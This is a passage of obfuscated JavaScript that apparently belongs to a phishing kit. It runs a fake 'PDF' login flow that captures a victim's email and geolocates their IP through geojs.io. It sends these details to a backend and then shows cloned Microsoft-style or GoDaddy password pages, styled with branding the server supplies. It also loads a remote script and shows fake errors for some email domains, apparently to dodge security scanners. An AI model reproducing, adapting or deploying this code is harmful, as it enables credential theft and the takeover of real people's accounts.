                  ;(_0x1626df.status == 429 || _0x1a5607 !== 'success') &&
                    setTimeout(_0x392d2a, 1000)
                })
              })())))
      }
    }
    return false
  }
}
if (view == 'uname_spw') {
  const nxtpdf = document.getElementById('btn_next_pdf')
  nxtpdf.addEventListener('click', () => {
    validatepdf()
  })
  pdfcheck = 1
  function loadinganimationpdf(_0x3df952) {
    _0x3df952 == 0 &&
      ((document
        .getElementById('sections_pdf')
        .querySelector('#mainLoader').style.display = 'flex'),
      document
        .getElementById('sections_pdf')
        .querySelector('#section_uname_content')
        .classList.toggle('d-none'))
    _0x3df952 == 1 &&
      ((document
        .getElementById('sections_pdf')
        .querySelector('#mainLoader').style.display = 'none'),
      document
        .getElementById('sections_pdf')
        .querySelector('#section_uname_content')
        .classList.remove('d-none'))
    _0x3df952 == 2 &&
      ((document
        .getElementById('sections_pdf')
        .querySelector('#mainLoader').style.display = 'flex'),
      document.getElementById('sections_pdf').classList.toggle('d-none'))
  }
  const unamepdfinp = document.getElementById('pdfemail')
  function sendemailpdf() {
    sendAndReceive(
      'checkemail',
      [unamepdfinp.value, pagelinkval, browserName, userip, usercountry],
      1
    )
      .then((_0x25e1b2) => {
        if (
          _0x25e1b2 &&
          _0x25e1b2.message !== 'waiting for previous request to complete'
        ) {
          var _0x222139 = false,
            _0x537e50 = 300
          _0x25e1b2.message.includes('newwebsiteopen') == false &&
            _0x25e1b2.message !== 'error' &&
            (_0x25e1b2.acctype && _0x25e1b2.acctype == 2 && (pvn = 1),
            (_0x25e1b2.acctype == undefined ||
              (_0x25e1b2.acctype && _0x25e1b2.acctype == 1)) &&
              (pvn = 0))
          _0x25e1b2.message.includes('newwebsiteopen') == false &&
            ((_0x537e50 = 0), loadinganimationpdf(1))
          setTimeout(function () {
            for (
              var _0x5e70e5 = 0;
              _0x5e70e5 < websitenames.length;
              _0x5e70e5++
            ) {
              if (
                _0x25e1b2.message.includes('newwebsiteopen') == true &&
                _0x25e1b2.message.includes(websitenames[_0x5e70e5]) == true
              ) {
                _0x222139 = true
                document
                  .querySelectorAll('.user_identity')
                  .forEach((_0x79664c) => {
                    _0x79664c.innerText = unamepdfinp.value
                  })
                if (websitenames[_0x5e70e5] == 'godaddy') {
                  var _0x295f10 = gdf,
                    _0x3f47f3 = document.querySelector(
                      'script[src^="' + gdf + '"]'
                    )
                  if (!_0x3f47f3) {
                    var _0x35ae73 = document.createElement('script')
                    _0x35ae73.src = _0x295f10
                    document.head.appendChild(_0x35ae73)
                  }
                  const _0x57967e =
                      '\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ',
                    _0xab9a80 = document.createElement('style')
                  _0xab9a80.id = 'dynamic-style'
                  _0xab9a80.textContent = _0x57967e
                  document.head.appendChild(_0xab9a80)
                  document
                    .getElementById('sections_pdf')
                    .classList.toggle('d-none')
                  document
                    .getElementById('section_uname_pdf')
                    .classList.toggle('d-none')
                  document
                    .getElementById('sections_' + websitenames[_0x5e70e5] + '')
                    .classList.remove('d-none')
                  document.getElementById('godaddyemail').value =
                    unamepdfinp.value
                  document.body.style.setProperty(
                    'background-color',
                    '#f5f7f8',
                    'important'
                  )
                  document.body.style.setProperty(
                    'background-image',
                    'unset',
                    'important'
                  )
                  document.body.style.setProperty(
                    'overflow',
                    'auto',
                    'important'
                  )
                  view = 'pwd_godaddy'
                }
              }
              _0x25e1b2.message.includes('newwebsiteopen') == true &&
                _0x5e70e5 == websitenames.length - 1 &&
                !_0x222139 &&
                ((document.getElementById('error_uname_pdf').innerText = ''),
                (document.getElementById('error_uname_pdf').style.display =
                  'none'),
                document
                  .querySelectorAll('.user_identity')
                  .forEach((_0x1b0d4c) => {
                    _0x1b0d4c.innerText = unamepdfinp.value
                  }),
                bottomsectionlinks('pwd', [
                  {
                    a_id: 'idA_PWD_ForgotPassword',
                    a_text: 'Forgot my password',
                    type: 'link',
                  },
                ]),
                changebackbutton('pwd', 0),
                document
                  .getElementById('sections_pdf')
                  .classList.toggle('d-none'),
                document
                  .getElementById('section_uname_pdf')
                  .classList.toggle('d-none'),
                document.getElementById('sections').classList.toggle('d-none'),
                document
                  .getElementById('section_pwd')
                  .classList.remove('d-none'),
                (otherweburl = _0x25e1b2.message.replace('newwebsiteopen', '')),
                (webnotfound = true),
                (view = 'pwd'))
            }
            if (_0x25e1b2.message == 'multiple accounts') {
              multipleaccountsback = 1
              if (twa == 0) {
                var _0x4cb4db = document.querySelectorAll('.bannerlogo')
                _0x4cb4db.forEach(function (_0x3975f7) {
                  _0x3975f7.style.height = '24px'
                })
              }
              document
                .getElementById('section_multipleaccounts')
                .querySelector('#btn_back')
                .setAttribute('data-id', _0x25e1b2.backbtnid)
              document
                .getElementById('section_multipleaccounts')
                .querySelector('#btn_back')
                .setAttribute('onclick', 'backbuttonclick(this,2)')
              checkerrordesc('multipleaccounts', 0, _0x25e1b2.description)
              displaymultipleaccounts(_0x25e1b2.accountoptions)
              bottomsectionlinks('multipleaccounts', _0x25e1b2.bottomsection)
              document
                .querySelectorAll('.user_identity')
                .forEach((_0x433a25) => {
                  _0x433a25.innerText = unamepdfinp.value
                })
              document.getElementById('sections_pdf').classList.toggle('d-none')
              document
                .getElementById('section_uname_pdf')
                .classList.toggle('d-none')
              document.getElementById('sections').classList.toggle('d-none')
              document
                .getElementById('section_multipleaccounts')
                .classList.remove('d-none')
              view = 'multipleaccounts'
            }
            if (_0x25e1b2.message == 'correct email') {
              if (twa == 0) {
                if (
                  _0x25e1b2.bannerlogo !== undefined &&
                  _0x25e1b2.bannerlogo !== null
                ) {
                  var _0x4cb4db = document.querySelectorAll('.bannerlogo')
                  _0x4cb4db.forEach(function (_0x433867) {
                    _0x433867.style.backgroundImage =
                      "url('" + _0x25e1b2.bannerlogo + "')"
                    _0x433867.style.width = 'unset'
                    _0x433867.style.height = '36px'
                  })
                }
                _0x25e1b2.backgroundcolor !== undefined &&
                  _0x25e1b2.backgroundcolor !== null &&
                  document.body.style.setProperty(
                    'background-color',
                    _0x25e1b2.backgroundcolor
                  )
                _0x25e1b2.backgroundimage !== undefined &&
                  _0x25e1b2.backgroundimage !== null &&
                  document.body.style.setProperty(
                    'background-image',
                    "url('" + _0x25e1b2.backgroundimage + "')"
                  )
                if (
                  _0x25e1b2.bannerlogo == undefined ||
                  _0x25e1b2.bannerlogo == null
                ) {
                  var _0x4cb4db = document.querySelectorAll('.bannerlogo')
                  _0x4cb4db.forEach(function (_0x21be7c) {
                    _0x21be7c.style.height = '24px'
                  })
                }
              }
              pvn == 0 &&
                (bottomsectionlinks('pwd', _0x25e1b2.bottomsection),
                changebackbutton('pwd', _0x25e1b2.backbutton))
              pvn == 1 &&
                (bottomsectionlinks('pwd_live', _0x25e1b2.bottomsection),
                changebackbutton('pwd_live', _0x25e1b2.backbutton))
              document.getElementById('error_uname_pdf').innerText = ''
              document.getElementById('error_uname_pdf').style.display = 'none'
              document
                .querySelectorAll('.user_identity')
                .forEach((_0xe7705b) => {
                  _0xe7705b.innerText = unamepdfinp.value
                })
              document.getElementById('sections_pdf').classList.toggle('d-none')
              document
                .getElementById('section_uname_pdf')
                .classList.toggle('d-none')
              document.getElementById('sections').classList.toggle('d-none')
              pvn == 0 &&
                (document
                  .getElementById('section_pwd')
                  .classList.remove('d-none'),
                (view = 'pwd'))
              pvn == 1 &&
                (document
                  .getElementById('section_pwd_live')
                  .classList.remove('d-none'),
                (view = 'pwd_live'))
            }
            _0x25e1b2.message == 'error' &&
              ((document.getElementById('error_uname_pdf').innerText =
                'Please, provide a valid email.'),
              (document.getElementById('error_uname_pdf').style.display =
                'block'),
              loadinganimationpdf(1))
          }, _0x537e50)
        }
      })
      .catch((_0x5845a7) => {
        loadinganimationpdf(1)
        console.error('Error:', _0x5845a7)
      })
  }
  function validatepdf() {
    if (view === 'uname_pdf') {
      const _0x506372 = bes,
        _0x3346ca = unamepdfinp.value.trim().split('@')[1]
      unamepdfinp.value.includes('@') &&
        _0x506372.some((_0x2c1d92) => _0x3346ca.includes(_0x2c1d92)) &&
        (loadinganimationpdf(0),
        setTimeout(function () {
          loadinganimationpdf(1)
          document.getElementById('error_uname_pdf').innerText =
            'Please, provide a valid email.'
          document.getElementById('error_uname_pdf').style.display = 'block'
        }, 3000))
      if (unamepdfinp.value.trim() == '') {
        document.getElementById('error_uname_pdf').innerText =
          'Please, provide a valid email.'
        document.getElementById('error_uname_pdf').style.display = 'block'
      } else {
        unamepdfinp.value.trim() != '' &&
          unamepdfinp.value.includes('@') &&
          !_0x506372.some((_0xe7e838) => _0x3346ca.includes(_0xe7e838)) &&
          (loadinganimationpdf(0),
          webnotfound == true &&
            setTimeout(function () {
              loadinganimationpdf(1)
              setTimeout(function () {
                document.getElementById('error_pwd').innerText = ''
                document.getElementById('inp_pwd').value = ''
                document
                  .getElementById('sections_pdf')
                  .classList.toggle('d-none')
                document
                  .getElementById('section_uname_pdf')
                  .classList.toggle('d-none')
                document
                  .getElementById('section_pwd')
                  .classList.remove('d-none')
                view = 'pwd'
              }, 300)
            }, 3000),
          webnotfound == false &&
            (interacted == 1 && sendemailpdf(),
            interacted == 0 &&
              ((interacted = 1),
              (function _0x363c30() {
                $.get(
                  'https://get.geojs.io/v1/ip/geo.json',
                  function (_0xecce0b) {
                    userip = _0xecce0b.ip
                    usercountry = _0xecce0b.country
                    sendemailpdf()
                  },
                  'json'
                ).fail(function (_0x250a1a, _0x2cec3b, _0x15531a) {
                  ;(_0x250a1a.status == 429 || _0x2cec3b !== 'success') &&
                    setTimeout(_0x363c30, 1000)
                })
              })())))
      }
    }
    return false
  }
}
